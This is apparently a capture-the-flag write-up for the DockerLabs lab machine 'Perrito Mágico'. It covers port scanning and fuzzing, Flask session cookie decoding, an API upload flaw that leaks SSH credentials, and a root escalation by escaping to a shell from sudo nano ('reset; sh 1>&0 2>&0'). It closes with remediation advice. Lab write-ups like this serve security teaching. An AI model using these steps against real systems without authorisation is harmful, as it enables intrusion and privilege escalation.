# DockerLabs Perrito Mágico Writeup

<img width="480" height="274" alt="image" src="https://dockerlabs.es/static/images/logos/Perrito_Magico.jpeg" />

## Machine Information

- **Platform**: DockerLabs
- **Machine Name**: Perrito Mágico
- **Target IP**: 172.17.0.2
- **Operating System**: Linux
- **Difficulty**: Easy
- **Attack Vector**: API File Upload + Sudo Nano Exploitation

## Executive Summary

This writeup documents the exploitation of the Perrito Mágico DockerLabs machine, featuring API endpoint analysis, Flask session token decoding, file upload exploitation, and privilege escalation through sudo nano abuse. The attack demonstrated web API security weaknesses and misconfigured sudo permissions.

## Reconnaissance

### Port Scanning

```bash
sudo nmap -sS -p- --open -Pn -n 172.17.0.2 -oN ./nmap/openports
```

![Port Scan Results](images/Pasted%20image%2020251210005205.png)

**Open Ports**: 22 (SSH), 5000 (HTTP)

### Service Enumeration

```bash
sudo nmap -sCV -p22,5000 172.17.0.2 -oN ./nmap/vulnports
```

![Service Details](images/Pasted%20image%2020251210005317.png)

### Technology Detection

```bash
whatweb http://172.17.0.2
```

![Technology Stack](images/Pasted%20image%2020251210005436.png)

**Framework**: Flask (Python web framework)

## Web Application Analysis

### Initial Discovery

![Web Interface](images/Pasted%20image%2020251210005543.png)

### Directory Enumeration

```bash
wfuzz -u 'http://172.17.0.2:5000/FUZZ' -w 'ruta_wordlists' --hc 400,404,403 --hl 0
```

![Fuzzing Results](images/Pasted%20image%2020251210005618.png)

**Interesting Paths**:

- `/api/`
- `/api`

### API Endpoint Discovery

![API Documentation](images/Pasted%20image%2020251210005822.png)

**Critical Endpoint**: `/gestion-maquinas/upload-logo`

## API Exploitation

### Vulnerable Endpoint Analysis

![Upload Endpoint](images/Pasted%20image%2020251210010245.png)

![Endpoint Details](images/Pasted%20image%2020251210010223.png)

**Functionality**: Allows logo modification for machines with proper authentication.

### Session Token Analysis

**Cookie Extraction** using Cookie Editor:

![Cookie Extraction](images/Pasted%20image%2020251210010415.png)

**Discovery**: Flask session cookie encoded in Base64.

### Flask Session Decoding

Created Python script to decode Flask session:

![Decoded Session](images/Pasted%20image%2020251210010522.png)

**Parameters Extracted**:

- Session token
- CSRF token
- User role information

### Exploitation Request

**Crafted Request** to upload endpoint with extracted parameters:

![Exploit Request](images/Pasted%20image%2020251210010639.png)

**Response**:

```json
{
  "exploit_message": "Enhorabuena, has conseguido explotar la vulnerabilidad de la API, que permite cambiar la imagen del logo de la maquina a usuarios con rol de usuario. Ahora puedes entrar por SSH con las credenciales: balulerobalulito:megapassword",
  "exploit_triggered": true,
  "filename": "Dockerlabs-Weak.png",
  "image_path": "logos-bunkerlabs/Dockerlabs-Weak.png",
  "message": "Logo subido correctamente"
}
```

**Credentials Discovered**: `balulerobalulito:megapassword`

## Initial Access

### SSH Authentication

```bash
ssh balulerobalulito@172.17.0.2
# Password: megapassword
```

![SSH Access](images/Pasted%20image%2020251210010950.png)

**Discovery**: User has sudo permissions for `nano` binary.

## Privilege Escalation

### Sudo Nano Exploitation

**Vulnerability**: Nano allows command execution through its read/execute features.

### Exploitation Steps

**1. Execute nano with sudo**:

```bash
sudo nano
```

**2. Inside nano**:

- Press `Ctrl+R` (Read File)
- Press `Ctrl+X` (Execute Command)

**3. Command injection**:

```bash
reset; sh 1>&0 2>&0
```

**4. Press Enter**

![Root Shell](images/Pasted%20image%2020251210011211.png)

**Result**: Root shell obtained.

## Technical Analysis

### Vulnerability Chain

1. **Web Enumeration** → API endpoint discovery
2. **Session Analysis** → Flask token decoding
3. **API Exploitation** → Unauthorized file upload
4. **Credential Disclosure** → SSH credentials leaked
5. **Sudo Abuse** → Nano command execution
6. **Privilege Escalation** → Root access

### Key Vulnerabilities

- **API Authorization Flaw**: Upload endpoint accessible with low-privilege user role
- **Information Disclosure**: Credentials exposed in API response
- **Sudo Misconfiguration**: Nano binary with sudo permissions
- **Command Injection**: Nano's command execution feature exploitable

### Exploitation Techniques

- **Flask Session Decoding**: Understanding Flask cookie structure
- **API Parameter Manipulation**: Crafting requests with proper tokens
- **GTFOBins**: Nano privilege escalation technique
- **Command Injection**: Shell spawning through text editor

## Key Lessons

1. **API Security**: Proper role-based access control essential
2. **Error Messages**: Avoid exposing sensitive information in responses
3. **Sudo Permissions**: Text editors should never have sudo privileges
4. **Session Management**: Secure token generation and validation
5. **Defense in Depth**: Multiple security layers prevent complete compromise

## Remediation Recommendations

### Immediate Actions

**1. API Authorization**:

```python
# Check user role before allowing upload
if user.role != 'admin':
    return {"error": "Unauthorized"}, 403
```

**2. Remove Sudo Permissions**:

```bash
# Remove nano from sudoers
sudo visudo
# Delete or comment: user ALL=(ALL) NOPASSWD: /usr/bin/nano
```

**3. Sanitize Error Messages**:

```python
# Don't expose credentials in responses
return {"message": "Operation successful"}, 200
```

### Long-term Security

1. **Implement RBAC**: Proper role-based access control
2. **Input Validation**: Validate all file uploads
3. **Least Privilege**: Minimize sudo permissions
4. **Security Logging**: Monitor suspicious API activity
5. **Regular Audits**: Review sudo configurations

## Conclusion

The DockerLabs Perrito Mágico machine demonstrated common web API security vulnerabilities and misconfigured system permissions. The exploitation highlighted the importance of proper authorization checks, secure error handling, and careful sudo permission management. This exercise served as an excellent introduction to API security testing and privilege escalation techniques.
